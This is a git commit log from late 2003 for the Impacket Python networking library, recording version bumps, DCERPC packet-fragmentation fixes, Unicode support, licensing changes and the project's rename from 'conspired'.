Date:   Tue Dec 16 17:26:22 2003 +0000

    Bumped version number.

commit 32ba2a07db8f251fb30eb2db05d21ff01fe13cef
Author: jkohen <jkohen@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Dec 16 17:25:26 2003 +0000

    -

commit eeb648a333040b28beff2c4e4c3715ba3f2c202f
Author: jkohen <jkohen@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Dec 16 17:23:42 2003 +0000

    Fixed wrong indentation that was causing fragmentation to go wrong.

commit 7dc3c77d4ecf6f90d91a82867b45e18e12df9c87
Author: jkohen <jkohen@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Dec 10 23:42:47 2003 +0000

    Bumped version number.

commit 6d86749f2e6ab3cff8d92a36415978a9729c2bcc
Author: jkohen <jkohen@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Dec 10 23:42:15 2003 +0000

    -

commit f86b8cc26460451cc6d723b47419d5dc8f3b265a
Author: jkohen <jkohen@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Dec 10 23:41:43 2003 +0000

    (DCERPC_v4.bind): support idempotent flag.
    (DCERPC_v4.send): reduced fragment size to avoid IP fragmentation on links with MTU = 1500. Added a method that allows the caller to configure this size.

commit 6d2b1a19aae53d438cbd5c3cbb05485b77705ed5
Author: jkohen <jkohen@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Dec 2 22:42:55 2003 +0000

    Updates.

commit faa6d8b3020e4f62e97cbdc532b0f23565e8f2b0
Author: jkohen <jkohen@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Dec 2 22:42:48 2003 +0000

    DCERPC_v4.bind: made self.__bind protected
    DCERPC_v4.send: fragment outgoing packets.

commit 4c35168a0e3781430054ee4b6fd7ab5521b7fd39
Author: jkohen <jkohen@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Nov 28 15:39:11 2003 +0000

    Include ChangeLog in packet.

commit 37ab5e554ebe47d88cc987012dcddc59038f6147
Author: jkohen <jkohen@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Nov 28 15:38:39 2003 +0000

    Initial revision.

commit c19c79f07308e57f65ab7d7009b721c192abbae6
Author: jkohen <jkohen@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Nov 28 15:32:56 2003 +0000

    Fixed self.bind variable having the same name than a method.
    Thanks Python for being so stupidily untyped :)

commit 4415e5a3183a85e378336095564377ec567a934f
Author: jkohen <jkohen@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Nov 14 21:26:07 2003 +0000

    Properly support Unicode input.

commit 227c6bd63e676f3e9880f9310714ec3e0d34f71c
Author: jkohen <jkohen@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Nov 14 21:01:43 2003 +0000

    Bumped version number.

commit 3a02cd9550a0769747ddac039c38fde45999f972
Author: jkohen <jkohen@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Nov 14 21:00:56 2003 +0000

    Properly support Unicode.

commit e58c84a2359197b30ba3d289ecbe09d9e0fb5d04
Author: jkohen <jkohen@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Oct 31 21:16:50 2003 +0000

    Bumped version to 0.9.3.

commit 5eafe72c26521b087899ab82771bdcdb160d70de
Author: jkohen <jkohen@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Oct 31 21:14:21 2003 +0000

    Fixed offset of handle in SVCCTLRespCreateServiceHeader.

commit 6dc9e592612796254188d8a88d863e511ad8aff5
Author: jkohen <jkohen@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Oct 28 21:05:16 2003 +0000

    Bumped version number to 0.9.2.

commit 45883a7afa48292323ea97da8c20dc9bf1707eee
Author: jkohen <jkohen@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Oct 28 21:03:08 2003 +0000

    Initial revision.

commit 611348de29fe4a3c6f9d2cef10b5c602455860bf
Author: jkohen <jkohen@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Oct 28 21:02:20 2003 +0000

    Fixed output formatting.

commit c273b0e33f6395231d69c8ec91a7ae45e571ce06
Author: jkohen <jkohen@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Oct 28 20:52:12 2003 +0000

    Added missing imports.

commit 26fdc3e16117b1b8d3ab2c3578d35dc49d81cf08
Author: jkohen <jkohen@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Oct 28 19:50:38 2003 +0000

    s/from impact/from impacket/

commit 324fb1078105cf2c2353ae4e9d3a42e61a6a507e
Author: jkohen <jkohen@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Oct 28 19:50:29 2003 +0000

    s/from impact/from impacket/.
    Protected socket.settimeout calls within a try/except block.

commit aab39d6c42dd8881248af555ddf44c7732316152
Author: jkohen <jkohen@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Oct 28 19:30:24 2003 +0000

    Initial revision.

commit 7065ab5979b28c5d1631bae361193f187bcf1637
Author: jkohen <jkohen@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Oct 28 18:45:51 2003 +0000

    Added missing imports.

commit 84b82fae4e2c736680630ef0fe9841d7bf29a3f6
Author: jkohen <jkohen@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Oct 27 17:46:46 2003 +0000

    Removed remaining HTML markup.

commit f9882d7bc39547c63ee12714ebe93bfbf72818a1
Author: jkohen <jkohen@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Oct 27 17:46:03 2003 +0000

    Initial revision.

commit cc494bc3d23ab5ce2f86ffe32f27ef3c534ad334
Author: jkohen <jkohen@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Oct 27 17:37:16 2003 +0000

    Bumped version number to 0.9.1.

commit 3402b5675834ee3498be3dd2b8006b5d68923d84
Author: jkohen <jkohen@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Oct 27 17:36:57 2003 +0000

    Changed source license to Apache.

commit 1dba4c20e0d47ec614521e251d072116f75f3ef8
Author: jkohen <jkohen@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Oct 27 17:33:42 2003 +0000

    Added Pysmb license.

commit dd89f918ddb0123fcd5262dbc3b1a1c6138cd90e
Author: jkohen <jkohen@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Oct 24 20:21:30 2003 +0000

    Added LICENSE.

commit 28aab9a98188adfde10c6642de2c4ea6afee660e
Author: jkohen <jkohen@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Oct 24 20:21:14 2003 +0000

    Added README and LICENSE to the binary distribution.

commit 1e1b77896b50062974fb29c68aa3c06b8c3dcdff
Author: jkohen <jkohen@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Oct 24 20:20:38 2003 +0000

    Initial revision.

commit c359ea340099a315d6886f06530268282eccfa17
Author: jkohen <jkohen@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Oct 24 17:52:06 2003 +0000

    Global rename from conspired to impacket.

commit a9aef3b4d58c5b41baa50b4fd35b68ba08f28677
Author: jkohen <jkohen@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Oct 23 19:26:16 2003 +0000

    Updated to reflect very minor changes in the Pcapy API.

commit 330218aa4ce9557a28f35cb4e96d630e4129cc12
Author: jkohen <jkohen@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Oct 23 19:25:49 2003 +0000

    Updated contact info.

commit 4ac639ef9ad58abad029f445a3261a8382a298d6
Author: jkohen <jkohen@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Oct 20 22:04:52 2003 +0000

    Added documentation.
    Fixed catch of the mysterious PcapError exception.

commit b9bc816237a9de20a64c0119f1ee5c86ad4ab213
Author: jkohen <jkohen@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Oct 20 15:49:43 2003 +0000

    Split pcap capture files into smaller ones, one for each TCP connection found in the original.

commit 2d9bee978cb19f79739597b08d4d593700a9e3a8
Author: jkohen <jkohen@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Oct 9 17:50:36 2003 +0000

    Include examples and this very file into source distributions.

commit 60b31ed69f794478c4d8ce3b4d63ef0d7d28d3f8
Author: jkohen <jkohen@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Oct 9 17:47:05 2003 +0000

    s/disectors/dissectors/

commit 6d01f6287c209bc1e406b0a03c4ff49520cfed9e
Author: jkohen <jkohen@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Oct 9 17:40:37 2003 +0000

    Initial revision
